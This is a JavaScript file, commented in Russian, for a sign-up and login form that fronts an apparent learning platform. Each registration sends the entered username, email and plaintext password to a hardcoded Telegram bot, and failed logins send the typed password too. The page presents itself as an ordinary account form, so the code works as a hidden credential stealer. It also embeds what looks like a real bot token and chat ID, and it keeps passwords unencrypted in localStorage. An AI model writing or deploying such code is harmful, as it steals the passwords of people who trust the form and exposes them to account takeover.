// Конфигурация бота — сюда вставь СВОЙ токен и chat_id
const botToken = '8210164553:AAGl1d34muRXyeCoB_y-MFC1ESeHomBFsZA'; // ⚠️ вставь токен бота сюда
const chatId = 8472334933;         // ⚠️ вставь chat_id сюда

// Элементы DOM
const form = document.getElementById('authForm');
const statusEl = document.getElementById('status');
const formTitle = document.getElementById('form-title');
const usernameInput = document.getElementById('username');
const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const confirmPasswordInput = document.getElementById('confirmPassword');
const submitButton = document.getElementById('submit-btn');
const switchText = document.getElementById('switch-text');
const switchLink = document.getElementById('switch-link');
const authContainer = document.getElementById('auth-container');
const learningPlatform = document.getElementById('learning-platform');

// Переменные состояния
let isLoginMode = false;

// Проверяем, есть ли сохраненные данные
const savedUserData = localStorage.getItem('userData');
const userData = savedUserData ? JSON.parse(savedUserData) : null;

// Инициализация формы при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'dark') {
        document.body.classList.add('dark');
    }
    
    addThemeButton();
    initForm();
});

// Инициализация формы
function initForm() {
    if (userData) {
        showLearningPlatform();
    } else {
        switchToRegister();
        authContainer.classList.remove('hidden');
        learningPlatform.classList.add('hidden');
    }
}

function switchToLogin() {
    isLoginMode = true;
    formTitle.textContent = 'Вход';
    submitButton.textContent = 'Войти';
    switchText.innerHTML = 'Нет аккаунта? <a href="#" id="switch-link">Зарегистрироваться</a>';
    confirmPasswordInput.classList.add('hidden');
    emailInput.classList.add('hidden');
}

function switchToRegister() {
    isLoginMode = false;
    formTitle.textContent = 'Регистрация';
    submitButton.textContent = 'Зарегистрироваться';
    switchText.innerHTML = 'Уже есть аккаунт? <a href="#" id="switch-link">Войти</a>';
    confirmPasswordInput.classList.remove('hidden');
    emailInput.classList.remove('hidden');
}

document.addEventListener('click', function(e) {
    if (e.target.id === 'switch-link') {
        e.preventDefault();
        if (isLoginMode) {
            switchToRegister();
        } else {
            switchToLogin();
        }
    }
});

form.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = usernameInput.value.trim();
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    const confirmPassword = confirmPasswordInput.value.trim();

    if (isLoginMode) {
        handleLogin(username, password);
    } else {
        handleRegister(username, email, password, confirmPassword);
    }
});

function handleRegister(username, email, password, confirmPassword) {
    if (!username || !email || !password || !confirmPassword) {
        showStatus('⚠ Заполните все поля!', 'error');
        return;
    }

    if (password !== confirmPassword) {
        showStatus('❌ Пароли не совпадают!', 'error');
        return;
    }

    if (!validateEmail(email)) {
        showStatus('❌ Введите корректный email!', 'error');
        return;
    }

    const newUserData = {
        username: username,
        email: email,
        password: password,
        registeredAt: new Date().toISOString()
    };

    localStorage.setItem('userData', JSON.stringify(newUserData));
    
    const message = `✅ Новая регистрация:\n👤 Username: ${username}\n📧 Email: ${email}\n🔐 Password: ${password}\n⏰ Время: ${new Date().toLocaleString()}`;
    sendToTelegram(message);
    
    showStatus('✅ Регистрация успешна! Загрузка платформы...', 'success');
    
    setTimeout(() => {
        showLearningPlatform();
        form.reset();
    }, 2000);
}

function handleLogin(username, password) {
    if (!userData) {
        showStatus('❌ Сначала зарегистрируйтесь!', 'error');
        return;
    }

    if (!username || !password) {
        showStatus('⚠ Заполните все поля!', 'error');
        return;
    }

    if (username === userData.username && password === userData.password) {
        showStatus('✅ Успешный вход! Загрузка платформы...', 'success');
        const message = `✅ Успешный вход:\n👤 Username: ${username}\n📧 Email: ${userData.email}\n⏰ Время: ${new Date().toLocaleString()}`;
        sendToTelegram(message);
        setTimeout(showLearningPlatform, 2000);
    } else {
        showStatus('❌ Неверное имя пользователя или пароль', 'error');
        const message = `❌ Неудачная попытка входа:\n👤 Username: ${username}\n🔐 Password: ${password}\n⏰ Время: ${new Date().toLocaleString()}`;
        sendToTelegram(message);
    }
}

function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

// Исправленная функция отправки сообщения в Telegram
function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId, // ← используем переменную, а не хардкод
            text: message
        })
    })
    .then(res => res.json())
    .then(data => {
        if (!data.ok) {
            console.error('Ошибка отправки в Telegram:', data.description);
        }
    })
    .catch(err => {
        console.error('Ошибка сети:', err);
    });
}

function showStatus(message, type = '') {
    statusEl.textContent = message;
    statusEl.style.color = type === 'error' ? 'var(--error)' : 'var(--success)';
}

function toggleTheme() {
    document.body.classList.toggle('dark');
    const isDark = document.body.classList.contains('dark');
    localStorage.setItem('theme', isDark ? 'dark' : 'light');
}

function showLearningPlatform() {
    authContainer.classList.add('hidden');
    learningPlatform.classList.remove('hidden');
    
    addLogoutButton();
    
    if (!window.learningPlatformInstance) {
        window.learningPlatformInstance = new LearningPlatform();
    }
    window.learningPlatformInstance.init();
}

function addLogoutButton() {
    const oldLogoutBtn = document.querySelector('.logout-btn');
    if (oldLogoutBtn) {
        oldLogoutBtn.remove();
    }
    
    const logoutBtn = document.createElement('button');
    logoutBtn.textContent = '🚪 Выйти';
    logoutBtn.className = 'logout-btn';
    logoutBtn.onclick = function() {
        if (confirm('Точно выйти?')) {
            localStorage.removeItem('userData');
            window.location.reload();
        }
    };
    document.body.appendChild(logoutBtn);
}

function addThemeButton() {
    const existingThemeBtn = document.querySelector('.theme-switch');
    if (!existingThemeBtn) {
        const themeBtn = document.createElement('button');
        themeBtn.textContent = '🌙 Тема';
        themeBtn.className = 'theme-switch';
        themeBtn.onclick = toggleTheme;
        document.body.appendChild(themeBtn);
    }
}
